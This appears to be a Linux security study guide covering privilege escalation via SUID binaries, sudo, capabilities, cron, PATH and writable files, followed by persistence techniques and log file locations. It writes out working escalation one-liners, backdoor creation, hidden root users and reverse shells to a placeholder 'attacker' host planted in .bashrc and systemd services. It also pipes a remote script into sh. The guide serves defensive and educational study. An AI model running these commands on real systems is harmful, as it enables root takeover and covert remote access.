# 10 - Linux Security
## Comprehensive Privilege Escalation, Persistence, Forensics, Container Security & Hardening Guide

---

## Table of Contents
1. [Privilege Escalation Vectors](#privilege-escalation-vectors)
2. [Persistence Mechanisms](#persistence-mechanisms)
3. [Critical Log Files & Locations](#critical-log-files--locations)
4. [Forensic Commands & Investigation](#forensic-commands--investigation)
5. [Auditd Configuration & Rules](#auditd-configuration--rules)
6. [Container Security (Docker/Kubernetes)](#container-security)
7. [Linux Hardening Checklist](#linux-hardening-checklist)
8. [Attack Detection Queries](#attack-detection-queries)
9. [Interview Questions](#interview-questions---linux-security)

---

## Privilege Escalation Vectors

### SUID/SGID Binary Abuse

```bash
# Find SUID binaries (run as owner, typically root)
find / -perm -4000 -type f 2>/dev/null

# Find SGID binaries (run as group owner)
find / -perm -2000 -type f 2>/dev/null

# Find both SUID and SGID
find / -perm /6000 -type f 2>/dev/null

# Find SUID owned by root
find / -perm -4000 -user root -type f 2>/dev/null

# List with permissions
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
```

```
EXPLOITABLE SUID BINARIES (GTFOBins Reference):
┌─────────────────┬────────────────────────────────────────────────────────────┐
│ Binary          │ Exploitation Technique                                     │
├─────────────────┼────────────────────────────────────────────────────────────┤
│ /usr/bin/find   │ find . -exec /bin/sh -p \; -quit                          │
├─────────────────┼────────────────────────────────────────────────────────────┤
│ /usr/bin/vim    │ vim -c ':!/bin/sh'                                         │
│                 │ vim -c ':py import os; os.execl("/bin/sh", "sh", "-p")'   │
├─────────────────┼────────────────────────────────────────────────────────────┤
│ /usr/bin/nmap   │ nmap --interactive (old versions)                         │
│ (old versions)  │ !sh                                                        │
├─────────────────┼────────────────────────────────────────────────────────────┤
│ /usr/bin/python │ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'    │
│ /usr/bin/python3│ python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'│
├─────────────────┼────────────────────────────────────────────────────────────┤
│ /usr/bin/perl   │ perl -e 'exec "/bin/sh";'                                  │
├─────────────────┼────────────────────────────────────────────────────────────┤
│ /usr/bin/ruby   │ ruby -e 'exec "/bin/sh -p"'                                │
├─────────────────┼────────────────────────────────────────────────────────────┤
│ /usr/bin/bash   │ bash -p                                                    │
├─────────────────┼────────────────────────────────────────────────────────────┤
│ /usr/bin/less   │ less /etc/passwd  →  !/bin/sh                             │
├─────────────────┼────────────────────────────────────────────────────────────┤
│ /usr/bin/more   │ more /etc/passwd  →  !/bin/sh                             │
├─────────────────┼────────────────────────────────────────────────────────────┤
│ /usr/bin/nano   │ nano /etc/sudoers (add user to sudoers)                   │
│                 │ nano /etc/passwd (add root user)                          │
├─────────────────┼────────────────────────────────────────────────────────────┤
│ /usr/bin/awk    │ awk 'BEGIN {system("/bin/sh")}'                           │
├─────────────────┼────────────────────────────────────────────────────────────┤
│ /usr/bin/tar    │ tar -cf /dev/null /dev/null --checkpoint=1                │
│                 │ --checkpoint-action=exec=/bin/sh                          │
├─────────────────┼────────────────────────────────────────────────────────────┤
│ /usr/bin/zip    │ zip /tmp/a.zip /tmp/a -T -TT 'sh #'                       │
├─────────────────┼────────────────────────────────────────────────────────────┤
│ /usr/bin/cp     │ cp /bin/bash /tmp/bash && chmod +s /tmp/bash             │
│                 │ (Requires write to file with root SUID set after copy)    │
├─────────────────┼────────────────────────────────────────────────────────────┤
│ /usr/bin/git    │ git help config  →  !/bin/sh                              │
├─────────────────┼────────────────────────────────────────────────────────────┤
│ /usr/bin/env    │ env /bin/sh -p                                             │
├─────────────────┼────────────────────────────────────────────────────────────┤
│ /usr/bin/strace │ strace -o/dev/null /bin/sh -p                             │
├─────────────────┼────────────────────────────────────────────────────────────┤
│ /usr/bin/ltrace │ ltrace -o/dev/null /bin/sh -p                             │
└─────────────────┴────────────────────────────────────────────────────────────┘

WHY -p FLAG:
- Preserves effective UID when starting shell
- Without -p, bash drops privileges to real UID
- Critical for SUID exploitation
```

### Sudo Misconfiguration

```bash
# Check current user's sudo permissions
sudo -l

# Common misconfigurations to look for
sudo -l | grep -E "(ALL|NOPASSWD|!root)"
```

```
DANGEROUS SUDO ENTRIES:
┌────────────────────────────────────────────┬───────────────────────────────────────────┐
│ Sudo Configuration                         │ Exploitation                              │
├────────────────────────────────────────────┼───────────────────────────────────────────┤
│ (ALL) NOPASSWD: /usr/bin/find              │ sudo find . -exec /bin/sh \; -quit       │
├────────────────────────────────────────────┼───────────────────────────────────────────┤
│ (ALL) NOPASSWD: /usr/bin/vim               │ sudo vim -c ':!/bin/sh'                   │
├────────────────────────────────────────────┼───────────────────────────────────────────┤
│ (ALL) NOPASSWD: /usr/bin/python*           │ sudo python3 -c 'import pty;pty.spawn... │
├────────────────────────────────────────────┼───────────────────────────────────────────┤
│ (ALL) NOPASSWD: /usr/bin/less              │ sudo less /etc/shadow → !/bin/sh         │
├────────────────────────────────────────────┼───────────────────────────────────────────┤
│ (ALL) NOPASSWD: /usr/bin/awk               │ sudo awk 'BEGIN {system("/bin/bash")}'   │
├────────────────────────────────────────────┼───────────────────────────────────────────┤
│ (ALL) NOPASSWD: /usr/bin/tar               │ sudo tar -cf /dev/null /dev/null \       │
│                                            │ --checkpoint=1 --checkpoint-action=exec= │
│                                            │ /bin/sh                                   │
├────────────────────────────────────────────┼───────────────────────────────────────────┤
│ (ALL) NOPASSWD: /usr/bin/rsync             │ sudo rsync -e 'sh -c "sh 0<&2 1>&2"' ... │
├────────────────────────────────────────────┼───────────────────────────────────────────┤
│ (ALL) NOPASSWD: /usr/bin/git               │ sudo git -p help → !/bin/sh              │
├────────────────────────────────────────────┼───────────────────────────────────────────┤
│ (ALL) NOPASSWD: /usr/bin/ftp               │ sudo ftp → !/bin/sh                       │
├────────────────────────────────────────────┼───────────────────────────────────────────┤
│ (ALL) NOPASSWD: /usr/bin/socat             │ sudo socat stdin exec:/bin/sh            │
├────────────────────────────────────────────┼───────────────────────────────────────────┤
│ (ALL) NOPASSWD: /usr/bin/ssh               │ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' │
├────────────────────────────────────────────┼───────────────────────────────────────────┤
│ (ALL) NOPASSWD: /usr/bin/curl              │ sudo curl file:///etc/shadow (read)      │
│                                            │ sudo curl -o /etc/passwd http://... (wri)│
├────────────────────────────────────────────┼───────────────────────────────────────────┤
│ (ALL) NOPASSWD: /usr/bin/wget              │ sudo wget -O /etc/passwd http://...      │
├────────────────────────────────────────────┼───────────────────────────────────────────┤
│ (ALL) NOPASSWD: /bin/cp                    │ Copy malicious /etc/passwd over original │
├────────────────────────────────────────────┼───────────────────────────────────────────┤
│ (ALL) NOPASSWD: /bin/mv                    │ Move malicious file over /etc/passwd     │
├────────────────────────────────────────────┼───────────────────────────────────────────┤
│ (ALL) NOPASSWD: /bin/chmod                 │ sudo chmod 777 /etc/shadow               │
│                                            │ sudo chmod u+s /bin/bash                 │
├────────────────────────────────────────────┼───────────────────────────────────────────┤
│ (ALL) NOPASSWD: /bin/chown                 │ sudo chown user:user /etc/shadow         │
├────────────────────────────────────────────┼───────────────────────────────────────────┤
│ (root) NOPASSWD: /usr/bin/env              │ sudo env /bin/sh                          │
├────────────────────────────────────────────┼───────────────────────────────────────────┤
│ (ALL) NOPASSWD: /usr/bin/docker            │ sudo docker run -v /:/mnt --rm -it alpine│
│                                            │ chroot /mnt sh                           │
├────────────────────────────────────────────┼───────────────────────────────────────────┤
│ (ALL) NOPASSWD: /usr/bin/journalctl        │ sudo journalctl → !/bin/sh               │
├────────────────────────────────────────────┼───────────────────────────────────────────┤
│ (ALL) NOPASSWD: /usr/bin/systemctl         │ Create malicious service, start it       │
├────────────────────────────────────────────┼───────────────────────────────────────────┤
│ (ALL, !root) /bin/bash                     │ sudo -u#-1 /bin/bash (CVE-2019-14287)    │
└────────────────────────────────────────────┴───────────────────────────────────────────┘

SUDO CVE HISTORY:
├── CVE-2019-14287: User ID -1 bypass (!root)
│   └── sudo -u#-1 /bin/bash
├── CVE-2021-3156 (Baron Samedit): Heap overflow
│   └── sudoedit -s '\' $(python3 -c 'print("A"*1000)')
├── CVE-2023-22809: sudoedit arbitrary file edit
│   └── EDITOR="vim -- /etc/sudoers" sudoedit /etc/hosts
└── CVE-2023-28486/7: sudo argument injection
```

### Linux Capabilities Abuse

```bash
# List all capabilities on system
getcap -r / 2>/dev/null

# Check specific binary
getcap /usr/bin/python3

# List capabilities of running process
cat /proc/<PID>/status | grep Cap
capsh --decode=<hex_value>
```

```
DANGEROUS CAPABILITIES:
┌───────────────────────┬──────────────────────────────────────────────────────────┐
│ Capability            │ Risk / Exploitation                                      │
├───────────────────────┼──────────────────────────────────────────────────────────┤
│ cap_setuid            │ Change UID to root                                       │
│                       │ python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'│
├───────────────────────┼──────────────────────────────────────────────────────────┤
│ cap_setgid            │ Change GID to root group                                 │
│                       │ python3 -c 'import os; os.setgid(0); os.system("/bin/sh")'│
├───────────────────────┼──────────────────────────────────────────────────────────┤
│ cap_dac_override      │ Bypass file read/write/execute permission checks         │
│                       │ Read /etc/shadow, write to /etc/passwd                   │
├───────────────────────┼──────────────────────────────────────────────────────────┤
│ cap_dac_read_search   │ Bypass file read permission, directory read/execute     │
│                       │ Read any file on system                                  │
├───────────────────────┼──────────────────────────────────────────────────────────┤
│ cap_chown             │ Make arbitrary changes to file ownership                 │
│                       │ chown /etc/shadow to user                                │
├───────────────────────┼──────────────────────────────────────────────────────────┤
│ cap_fowner            │ Bypass permission checks on file owner                   │
│                       │ Modify files owned by root                               │
├───────────────────────┼──────────────────────────────────────────────────────────┤
│ cap_sys_admin         │ Many admin operations: mount, quotas, etc.              │
│                       │ Mount filesystems, access raw devices                    │
├───────────────────────┼──────────────────────────────────────────────────────────┤
│ cap_sys_ptrace        │ ptrace() any process, read/write memory                 │
│                       │ Inject code into root processes                          │
├───────────────────────┼──────────────────────────────────────────────────────────┤
│ cap_sys_module        │ Load/unload kernel modules                               │
│                       │ Load rootkit module                                      │
├───────────────────────┼──────────────────────────────────────────────────────────┤
│ cap_net_raw           │ Use raw/packet sockets                                   │
│                       │ Sniff network traffic                                    │
├───────────────────────┼──────────────────────────────────────────────────────────┤
│ cap_net_admin         │ Network configuration, firewall, routing                 │
│                       │ Modify firewall rules                                    │
├───────────────────────┼──────────────────────────────────────────────────────────┤
│ cap_net_bind_service  │ Bind to ports < 1024                                     │
│                       │ Run service on privileged port                           │
├───────────────────────┼──────────────────────────────────────────────────────────┤
│ cap_sys_rawio         │ Perform I/O port operations                              │
│                       │ Direct hardware access                                   │
└───────────────────────┴──────────────────────────────────────────────────────────┘

CAPABILITY ESCALATION EXAMPLES:

# Python with cap_setuid
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl with cap_setuid
/usr/bin/perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'

# tar with cap_dac_read_search
/usr/bin/tar -cvf shadow.tar /etc/shadow
/usr/bin/tar -xvf shadow.tar
cat etc/shadow

# gdb with cap_sys_ptrace
gdb -p <root_process_pid>
(gdb) call system("/bin/bash")

# node with cap_chown
node -e 'process.initgroups("root", 0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```

### Kernel Exploits

```bash
# Check kernel version
uname -a
uname -r
cat /proc/version

# Check distribution
cat /etc/*release
cat /etc/issue

# Search for exploits
searchsploit linux kernel $(uname -r | cut -d'-' -f1) privilege escalation
```

```
NOTABLE KERNEL EXPLOITS (2016-2026):
┌───────────────────────┬──────────────────┬───────────────────────────────────────────┐
│ CVE                   │ Name             │ Affected Versions / Description           │
├───────────────────────┼──────────────────┼───────────────────────────────────────────┤
│ CVE-2016-5195         │ Dirty COW        │ Linux 2.6.22 - 4.8.3                      │
│                       │                  │ Copy-on-write race condition              │
├───────────────────────┼──────────────────┼───────────────────────────────────────────┤
│ CVE-2017-16995        │ eBPF             │ Linux 4.4 - 4.14                          │
│                       │                  │ eBPF arbitrary read/write                 │
├───────────────────────┼──────────────────┼───────────────────────────────────────────┤
│ CVE-2019-13272        │ PTRACE_TRACEME   │ Linux 4.10 - 5.1.17                       │
│                       │                  │ Broken PTRACE permission checks           │
├───────────────────────┼──────────────────┼───────────────────────────────────────────┤
│ CVE-2021-3156         │ Baron Samedit    │ Sudo 1.8.2 - 1.8.31p2 / 1.9.0 - 1.9.5p1 │
│                       │                  │ Heap overflow in sudo                     │
├───────────────────────┼──────────────────┼───────────────────────────────────────────┤
│ CVE-2021-3493         │ OverlayFS        │ Ubuntu 20.04/20.10/21.04                  │
│                       │                  │ Overlay filesystem privilege escalation  │
├───────────────────────┼──────────────────┼───────────────────────────────────────────┤
│ CVE-2021-4034         │ PwnKit           │ Polkit pkexec (most distros since 2009)  │
│                       │                  │ Out-of-bounds read in pkexec             │
├───────────────────────┼──────────────────┼───────────────────────────────────────────┤
│ CVE-2021-22555        │ Netfilter        │ Linux 2.6.19 - 5.12                       │
│                       │                  │ Netfilter heap out-of-bounds write       │
├───────────────────────┼──────────────────┼───────────────────────────────────────────┤
│ CVE-2022-0847         │ Dirty Pipe       │ Linux 5.8 - 5.16.11 / 5.15.25            │
│                       │                  │ Pipe splice arbitrary overwrite          │
├───────────────────────┼──────────────────┼───────────────────────────────────────────┤
│ CVE-2022-2588         │ route4           │ Linux 5.15 - 5.19                         │
│                       │                  │ Use-after-free in route4 filter          │
├───────────────────────┼──────────────────┼───────────────────────────────────────────┤
│ CVE-2022-32250        │ nft_set          │ Linux 5.4 - 5.18                          │
│                       │                  │ Use-after-free in nft_set_ops            │
├───────────────────────┼──────────────────┼───────────────────────────────────────────┤
│ CVE-2023-0386         │ OverlayFS        │ Linux 5.11 - 6.2                          │
│                       │                  │ FUSE/overlayfs escape                     │
├───────────────────────┼──────────────────┼───────────────────────────────────────────┤
│ CVE-2023-2640         │ GameOver(lay)    │ Ubuntu overlayfs                          │
│                       │                  │ Ubuntu-specific overlayfs vulnerability  │
├───────────────────────┼──────────────────┼───────────────────────────────────────────┤
│ CVE-2023-32233        │ nf_tables        │ Linux 6.0 - 6.3                           │
│                       │                  │ Use-after-free in nf_tables              │
├───────────────────────┼──────────────────┼───────────────────────────────────────────┤
│ CVE-2024-1086         │ nf_tables        │ Linux 3.15 - 6.7                          │
│                       │                  │ Double-free in nf_tables                 │
└───────────────────────┴──────────────────┴───────────────────────────────────────────┘

EXPLOIT CHECKING TOOLS:
├── Linux Exploit Suggester (LES)
│   └── ./linux-exploit-suggester.sh
├── LinPEAS
│   └── ./linpeas.sh
├── Linux Smart Enumeration (LSE)
│   └── ./lse.sh -l 2
└── linux-exploit-suggester-2.pl
```

### Cron Job Exploitation

```bash
# System cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# User cron jobs
crontab -l
ls -la /var/spool/cron/
ls -la /var/spool/cron/crontabs/

# Systemd timers (modern alternative)
systemctl list-timers --all
```

```
CRON EXPLOITATION SCENARIOS:

1. Writable Script Executed by Root
   # If /opt/backup.sh is world-writable and run by root cron:
   echo "chmod +s /bin/bash" >> /opt/backup.sh
   # Wait for cron execution
   /bin/bash -p

2. PATH Manipulation
   # If cron runs: backup.sh (without absolute path)
   # And cron PATH includes writable directory first
   # Create malicious backup.sh in writable path location
   echo '#!/bin/bash' > /tmp/backup.sh
   echo 'chmod +s /bin/bash' >> /tmp/backup.sh
   chmod +x /tmp/backup.sh

3. Wildcard Injection (tar)
   # If cron runs: cd /tmp && tar czf /backup/backup.tar.gz *
   cd /tmp
   echo "" > "--checkpoint=1"
   echo "" > "--checkpoint-action=exec=sh shell.sh"
   echo "chmod +s /bin/bash" > shell.sh
   chmod +x shell.sh

4. Wildcard Injection (rsync)
   # If cron runs: rsync -a * /backup/
   echo "" > "-e sh shell.sh"
   echo "chmod +s /bin/bash" > shell.sh

5. Wildcard Injection (chown)
   # If cron runs: chown user:group *
   echo "" > "--reference=/etc/passwd"
   # Creates file that makes chown use passwd as reference

DETECTION:
├── Check for writable scripts in cron
├── Check for relative paths in cron commands
├── Check for wildcard usage
├── Monitor /etc/crontab, /etc/cron.d/* modifications
└── Audit cron job execution
```

### PATH Variable Exploitation

```bash
# Check current PATH
echo $PATH

# Check system PATH in profile
cat /etc/environment
cat /etc/profile
cat ~/.bashrc
cat ~/.profile
```

```
PATH EXPLOITATION SCENARIOS:

1. Relative Command in Script with Insecure PATH
   # Script /opt/service.sh contains:
   #   #!/bin/bash
   #   service nginx restart

   # If script is SUID or run by root cron, and user can write to
   # a directory in PATH before /usr/sbin:
   echo '#!/bin/bash' > /tmp/service
   echo 'chmod +s /bin/bash' >> /tmp/service
   chmod +x /tmp/service
   export PATH=/tmp:$PATH
   /opt/service.sh

2. Library Path Hijacking (LD_LIBRARY_PATH)
   # Find binaries that load libraries from writable locations
   ldd /usr/bin/target_binary
   # Create malicious library
   gcc -shared -fPIC -o /tmp/libevil.so evil.c
   export LD_LIBRARY_PATH=/tmp
   /usr/bin/target_binary

3. LD_PRELOAD (if allowed)
   # Create malicious shared object
   # evil.c:
   #include <stdio.h>
   #include <stdlib.h>
   void _init() {
       setuid(0);
       system("/bin/bash -p");
   }
   gcc -shared -fPIC -nostartfiles -o /tmp/evil.so evil.c
   LD_PRELOAD=/tmp/evil.so /target/suid/binary
```

### Writable File/Directory Exploitation

```bash
# World-writable files
find / -type f -writable 2>/dev/null

# World-writable directories
find / -type d -writable 2>/dev/null

# Files with write permission for current user
find / -writable -type f 2>/dev/null

# Check for sensitive writable files
ls -la /etc/passwd /etc/shadow /etc/sudoers 2>/dev/null
```

```
SENSITIVE FILE TARGETS:

/etc/passwd (If Writable):
# Add new root user
openssl passwd -1 mypassword
# Output: $1$xyz$hash
echo 'newroot:$1$xyz$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
su newroot

/etc/shadow (If Writable):
# Generate password hash
openssl passwd -6 -salt xyz password
# Replace root's hash or add user

/etc/sudoers (If Writable):
echo 'username ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers

/.ssh/authorized_keys (If Writable):
# Generate key pair
ssh-keygen -t rsa -f key
cat key.pub >> /root/.ssh/authorized_keys
ssh -i key root@localhost

/etc/ld.so.preload (If Writable):
# Add malicious library that gets loaded by all programs
echo '/tmp/evil.so' >> /etc/ld.so.preload

/etc/crontab (If Writable):
echo '* * * * * root chmod +s /bin/bash' >> /etc/crontab
```

### NFS Misconfigurations

```bash
# Check NFS exports
cat /etc/exports
showmount -e <target>

# Check for no_root_squash
grep -i "no_root_squash" /etc/exports
```

```
NFS NO_ROOT_SQUASH EXPLOITATION:
# If NFS share has no_root_squash, root on client = root on server

# On attacker machine (as root):
mount -t nfs target:/shared_dir /mnt

# Create SUID binary
cp /bin/bash /mnt/rootbash
chmod +s /mnt/rootbash

# On target:
/shared_dir/rootbash -p
```

### Docker Group Membership

```bash
# Check if user is in docker group
id
groups

# If in docker group = effectively root
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
docker run -v /etc/passwd:/etc/passwd --rm -it alpine sh
docker run --privileged --rm -it alpine sh
```

### Enumeration Scripts

```bash
# LinPEAS - Most comprehensive
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Linux Smart Enumeration
./lse.sh -l 2

# Linux Exploit Suggester
./linux-exploit-suggester.sh

# LinEnum
./LinEnum.sh -t

# pspy - Monitor processes without root
./pspy64
```

---

## Persistence Mechanisms

### User-Level Persistence

```
USER-LEVEL PERSISTENCE LOCATIONS:
┌──────────────────────────────────────────┬──────────────────────────────────────────────┐
│ Location                                 │ Description / Trigger                        │
├──────────────────────────────────────────┼──────────────────────────────────────────────┤
│ ~/.bashrc                                │ Executes on each new interactive shell       │
│ ~/.bash_profile                          │ Executes on login shell                      │
│ ~/.profile                               │ Executes on login (fallback)                 │
│ ~/.bash_login                            │ Executes on login (if no .bash_profile)     │
│ ~/.bash_logout                           │ Executes on logout                           │
├──────────────────────────────────────────┼──────────────────────────────────────────────┤
│ ~/.zshrc                                 │ Zsh interactive shell                        │
│ ~/.zprofile                              │ Zsh login shell                              │
│ ~/.zshenv                                │ Zsh always executed                          │
├──────────────────────────────────────────┼──────────────────────────────────────────────┤
│ ~/.ssh/authorized_keys                   │ SSH key-based access                         │
│ ~/.ssh/rc                                │ Executes on SSH login                        │
├──────────────────────────────────────────┼──────────────────────────────────────────────┤
│ ~/.config/autostart/*.desktop            │ Desktop environment autostart                │
│ ~/.local/share/applications/*.desktop    │ User application launchers                   │
├──────────────────────────────────────────┼──────────────────────────────────────────────┤
│ crontab -e                               │ User cron jobs                               │
├──────────────────────────────────────────┼──────────────────────────────────────────────┤
│ ~/.config/systemd/user/*.service         │ User systemd services                        │
├──────────────────────────────────────────┼──────────────────────────────────────────────┤
│ ~/.pam_environment                       │ PAM environment variables                    │
├──────────────────────────────────────────┼──────────────────────────────────────────────┤
│ ~/.local/bin/ (in PATH)                  │ User-writable PATH location                  │
└──────────────────────────────────────────┴──────────────────────────────────────────────┘

EXAMPLES:

# .bashrc persistence (reverse shell on every new terminal)
echo 'nc -e /bin/bash attacker.com 4444 &' >> ~/.bashrc
echo '(bash -i >& /dev/tcp/attacker/4444 0>&1 &)' >> ~/.bashrc

# SSH key persistence
mkdir -p ~/.ssh
echo "ssh-rsa AAAA... attacker@box" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# User cron persistence
(crontab -l; echo "* * * * * /tmp/backdoor.sh") | crontab -

# XDG autostart (desktop environments)
cat > ~/.config/autostart/update.desktop << EOF
[Desktop Entry]
Type=Application
Name=System Update
Exec=/tmp/backdoor.sh
Hidden=true
EOF

# User systemd service
mkdir -p ~/.config/systemd/user/
cat > ~/.config/systemd/user/backdoor.service << EOF
[Unit]
Description=User Backup Service

[Service]
ExecStart=/bin/bash -c 'while true; do nc -e /bin/bash attacker 4444; sleep 60; done'
Restart=always

[Install]
WantedBy=default.target
EOF
systemctl --user daemon-reload
systemctl --user enable backdoor.service
systemctl --user start backdoor.service
```

### System-Level Persistence

```
SYSTEM-LEVEL PERSISTENCE LOCATIONS:
┌──────────────────────────────────────────┬──────────────────────────────────────────────┐
│ Location                                 │ Description / Trigger                        │
├──────────────────────────────────────────┼──────────────────────────────────────────────┤
│ /etc/crontab                             │ System cron table                            │
│ /etc/cron.d/*                            │ Cron job files                               │
│ /etc/cron.{hourly,daily,weekly,monthly}/ │ Periodic execution directories               │
├──────────────────────────────────────────┼──────────────────────────────────────────────┤
│ /etc/systemd/system/*.service            │ Systemd services                             │
│ /lib/systemd/system/*.service            │ Package-installed services                   │
│ /etc/systemd/system/*.timer              │ Systemd timers                               │
├──────────────────────────────────────────┼──────────────────────────────────────────────┤
│ /etc/init.d/*                            │ SysV init scripts                            │
│ /etc/rc.local                            │ Runs at end of boot (deprecated but works)  │
│ /etc/rc.d/rc.local                       │ RHEL variant                                 │
├──────────────────────────────────────────┼──────────────────────────────────────────────┤
│ /etc/profile                             │ System-wide shell profile                    │
│ /etc/profile.d/*.sh                      │ Shell profile snippets                       │
│ /etc/bash.bashrc                         │ System-wide bashrc                           │
│ /etc/environment                         │ System environment variables                 │
├──────────────────────────────────────────┼──────────────────────────────────────────────┤
│ /etc/ssh/sshd_config                     │ SSH daemon configuration                     │
│ /root/.ssh/authorized_keys               │ Root SSH access                              │
├──────────────────────────────────────────┼──────────────────────────────────────────────┤
│ /etc/passwd, /etc/shadow                 │ User account creation                        │
│ /etc/sudoers, /etc/sudoers.d/*          │ Privilege assignment                         │
├──────────────────────────────────────────┼──────────────────────────────────────────────┤
│ /lib/security/*.so                       │ PAM modules                                  │
│ /etc/pam.d/*                             │ PAM configuration                            │
├──────────────────────────────────────────┼──────────────────────────────────────────────┤
│ /etc/ld.so.preload                       │ Shared library preload                       │
│ /etc/ld.so.conf, /etc/ld.so.conf.d/*    │ Library search path                          │
├──────────────────────────────────────────┼──────────────────────────────────────────────┤
│ /etc/update-motd.d/*                     │ Message of the day scripts                   │
├──────────────────────────────────────────┼──────────────────────────────────────────────┤
│ /etc/apt/apt.conf.d/*                    │ APT hooks (Debian/Ubuntu)                    │
│ /etc/yum/pluginconf.d/*                  │ YUM hooks (RHEL/CentOS)                      │
├──────────────────────────────────────────┼──────────────────────────────────────────────┤
│ /lib/modules/$(uname -r)/               │ Kernel modules                               │
│ /etc/modules, /etc/modules-load.d/*     │ Module autoload                              │
└──────────────────────────────────────────┴──────────────────────────────────────────────┘

EXAMPLES:

# Systemd service persistence
cat > /etc/systemd/system/security-update.service << EOF
[Unit]
Description=Security Update Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do nc -e /bin/bash attacker 4444; sleep 60; done'
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable security-update.service
systemctl start security-update.service

# Systemd timer persistence
cat > /etc/systemd/system/backup.timer << EOF
[Unit]
Description=Backup Timer

[Timer]
OnCalendar=*:0/5
Persistent=true

[Install]
WantedBy=timers.target
EOF

# /etc/rc.local persistence
echo '#!/bin/bash' > /etc/rc.local
echo '/tmp/backdoor.sh &' >> /etc/rc.local
chmod +x /etc/rc.local

# PAM backdoor (very stealthy)
# Modify pam_unix.so to accept hardcoded password
# Or add malicious PAM module

# ld.so.preload (loads library into all processes)
echo '/lib/libevil.so' > /etc/ld.so.preload

# MOTD persistence (runs on login display)
echo '#!/bin/bash' > /etc/update-motd.d/99-backdoor
echo '/tmp/backdoor.sh &' >> /etc/update-motd.d/99-backdoor
chmod +x /etc/update-motd.d/99-backdoor

# Create hidden user
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash -c "" sysadmin
echo 'sysadmin:password' | chpasswd
```

### Stealthy Persistence Techniques

```
ADVANCED/STEALTHY PERSISTENCE:

1. Kernel Module (Rootkit)
   # Load malicious kernel module
   insmod /tmp/rootkit.ko
   # Or persist via /etc/modules-load.d/
   echo 'rootkit' >> /etc/modules-load.d/rootkit.conf

2. Shared Library Injection
   # Compile malicious shared library
   gcc -shared -fPIC -o /lib/libsystem.so evil.c
   # Add to preload
   echo '/lib/libsystem.so' >> /etc/ld.so.preload

3. Binary Replacement
   # Replace legitimate binary with trojaned version
   mv /usr/bin/sudo /usr/bin/sudo.orig
   cp /tmp/evil_sudo /usr/bin/sudo
   chmod +s /usr/bin/sudo

4. Git Hook Persistence
   # If git repos exist on system
   echo '#!/bin/bash' > /repo/.git/hooks/post-checkout
   echo '/tmp/backdoor.sh &' >> /repo/.git/hooks/post-checkout
   chmod +x /repo/.git/hooks/post-checkout

5. Udev Rules
   # Triggered on device events
   echo 'ACTION=="add", RUN+="/tmp/backdoor.sh"' > /etc/udev/rules.d/99-backdoor.rules

6. Capability-Based Binary
   # Instead of SUID, use capabilities (less obvious)
   cp /bin/bash /tmp/capbash
   setcap cap_setuid+ep /tmp/capbash

7. Apt/Dpkg Hooks
   echo 'APT::Update::Pre-Invoke {"/tmp/backdoor.sh &"};' > /etc/apt/apt.conf.d/99backdoor
```

---

## Critical Log Files & Locations

### Authentication Logs

```
AUTHENTICATION LOG LOCATIONS:
┌────────────────────────────────────────┬─────────────────────────────────────────────┐
│ Log File                               │ Description                                 │
├────────────────────────────────────────┼─────────────────────────────────────────────┤
│ /var/log/auth.log                      │ Debian/Ubuntu authentication events         │
│ /var/log/secure                        │ RHEL/CentOS authentication events           │
├────────────────────────────────────────┼─────────────────────────────────────────────┤
│ /var/log/wtmp                          │ Successful login records (binary)           │
│                                        │ Read with: last -f /var/log/wtmp           │
├────────────────────────────────────────┼─────────────────────────────────────────────┤
│ /var/log/btmp                          │ Failed login attempts (binary)              │
│                                        │ Read with: lastb -f /var/log/btmp          │
├────────────────────────────────────────┼─────────────────────────────────────────────┤
│ /var/log/lastlog                       │ Last login per user (binary)               │
│                                        │ Read with: lastlog                          │
├────────────────────────────────────────┼─────────────────────────────────────────────┤
│ /var/log/faillog                       │ Failed login counts (binary)               │
│                                        │ Read with: faillog                          │
├────────────────────────────────────────┼─────────────────────────────────────────────┤
│ /var/run/utmp                          │ Currently logged in users (binary)         │
│                                        │ Read with: who, w, users                   │
└────────────────────────────────────────┴─────────────────────────────────────────────┘

KEY EVENTS TO MONITOR:
├── SSH logins: "Accepted password", "Accepted publickey"
├── SSH failures: "Failed password", "Invalid user"
├── Sudo usage: "sudo:", "COMMAND="
├── Su usage: "su[", "session opened"
├── Account changes: "useradd", "usermod", "passwd"
└── PAM events: "pam_unix", "session opened/closed"
```

### System Logs

```
SYSTEM LOG LOCATIONS:
┌────────────────────────────────────────┬─────────────────────────────────────────────┐
│ Log File                               │ Description                                 │
├────────────────────────────────────────┼─────────────────────────────────────────────┤
│ /var/log/syslog                        │ General system messages (Debian/Ubuntu)    │
│ /var/log/messages                      │ General system messages (RHEL/CentOS)      │
├────────────────────────────────────────┼─────────────────────────────────────────────┤
│ /var/log/kern.log                      │ Kernel messages                             │
│ /var/log/dmesg                         │ Boot-time kernel ring buffer               │
├────────────────────────────────────────┼─────────────────────────────────────────────┤
│ /var/log/boot.log                      │ Boot process messages                       │
├────────────────────────────────────────┼─────────────────────────────────────────────┤
│ /var/log/cron                          │ Cron job execution (RHEL)                  │
│ /var/log/syslog                        │ Contains cron on Debian/Ubuntu             │
├────────────────────────────────────────┼─────────────────────────────────────────────┤
│ /var/log/daemon.log                    │ Daemon messages                             │
├────────────────────────────────────────┼─────────────────────────────────────────────┤
│ /var/log/mail.log                      │ Mail server logs                            │
├────────────────────────────────────────┼─────────────────────────────────────────────┤
│ /var/log/audit/audit.log               │ Auditd events (if enabled)                 │
└────────────────────────────────────────┴─────────────────────────────────────────────┘
```

